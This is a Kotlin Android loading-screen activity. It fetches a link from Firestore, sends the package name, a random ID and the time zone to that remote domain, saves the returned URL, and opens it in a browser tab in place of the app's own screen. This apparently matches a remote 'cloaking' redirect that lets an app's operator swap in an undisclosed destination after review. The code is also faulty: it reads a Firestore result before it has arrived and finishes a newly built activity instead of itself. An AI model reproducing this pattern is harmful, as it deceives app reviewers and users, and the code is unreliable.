package com.template

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabColorSchemeParams
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.google.firebase.firestore.DocumentSnapshot
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.TimeZone
import java.util.UUID

class LoadingActivity2 : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.M)
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { isGranted: Boolean ->
        if (isGranted) {
            startFirestoreCheck()
        }
    }

    private var wasFirestoreUrlNullOrEmpty = false
    private var isFinalUrlExist = false

    private val sharedPreferences by lazy {
        getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE)
    }

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            checkNotificationPermission()
        } else {
            startFirestoreCheck()
        }
    }

    @RequiresApi(Build.VERSION_CODES.M)
    private fun startFirestoreCheck() {

        val isNetworkActive =
            (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .activeNetwork

        if (isNetworkActive == null) {
            startActivity(Intent(this, MainActivity::class.java))
            return
        }

        wasFirestoreUrlNullOrEmpty =
            !sharedPreferences.getBoolean(WAS_FIRESTORE_URL_NULL_OR_EMPTY, false)
        val document: DocumentSnapshot

        if (wasFirestoreUrlNullOrEmpty) {
            preferencesEdit(
                sharedPreferences,
                WAS_FIRESTORE_URL_NULL_OR_EMPTY,
                wasFirestoreUrlNullOrEmpty
            )
            document = (application as App).firestoreDb
                .collection("database")
                .document("check")
                .get().result
        } else {
            preferencesEdit(
                sharedPreferences,
                WAS_FIRESTORE_URL_NULL_OR_EMPTY,
                wasFirestoreUrlNullOrEmpty
            )
            startActivity(Intent(this, MainActivity::class.java))
            return
        }

        isFinalUrlExist = sharedPreferences.getBoolean(IS_FINAL_URL_EXIST, false)

        if (isFinalUrlExist) {
            preferencesEdit(
                sharedPreferences,
                IS_FINAL_URL_EXIST,
                isFinalUrlExist
            )
            val url = sharedPreferences.getString(URL, "")
            startChromeCustomTabs(url!!)
            return
        } else {
            preferencesEdit(
                sharedPreferences,
                IS_FINAL_URL_EXIST,
                isFinalUrlExist
            )
            if (document != null) {
                val link = document.get("link").toString()
                startByUrl(link)
            }
        }


    }

    private fun startByUrl(domenFromFirebase: String) {
        val userAgent = WebView(this).settings.userAgentString
        lifecycleScope.launch(Dispatchers.IO) {
            val retofitClient = RetrofitService
                .getClient(domenFromFirebase, userAgent)
                .create(RetrofitClient::class.java)

            val call = retofitClient.getUrl(
                packageName = packageName,
                userId = "${UUID.randomUUID()}",
                timeZone = TimeZone.getDefault().id
            )

            val response = call.execute()

            if (response.isSuccessful) {
                isFinalUrlExist = true
                val url = response.body()
                sharedPreferences.edit()
                    .putString(URL, url)
                    .putBoolean(IS_FINAL_URL_EXIST, isFinalUrlExist)
                    .apply()

                startChromeCustomTabs(url!!)
            } else {
                wasFirestoreUrlNullOrEmpty = true
                preferencesEdit(
                    sharedPreferences,
                    WAS_FIRESTORE_URL_NULL_OR_EMPTY,
                    wasFirestoreUrlNullOrEmpty
                )
                startActivity(Intent(this@LoadingActivity2, MainActivity::class.java))
            }
        }
    }

    private fun startChromeCustomTabs(url: String) {
        val customTabsIntent = CustomTabsIntent.Builder()
            .setDefaultColorSchemeParams(
                CustomTabColorSchemeParams.Builder()
                    .setToolbarColor(
                        ContextCompat.getColor(this, R.color.black)
                    ).build()
            ).build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        LoadingActivity2().finish()
    }

    private fun preferencesEdit(
        preferences: SharedPreferences,
        variableName: String,
        variable: Boolean
    ) {
        preferences.edit()
            .putBoolean(variableName, variable)
            .apply()
    }


    private fun checkNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    companion object {
        const val APP_PREFERENCES = "APP_PREFERENCES"
        const val URL = "URL"
        const val IS_FINAL_URL_EXIST = "IS_FINAL_URL_EXIST"
        const val WAS_FIRESTORE_URL_NULL_OR_EMPTY = "WAS_FIRESTORE_URL_NULL_OR_EMPTY"
    }
}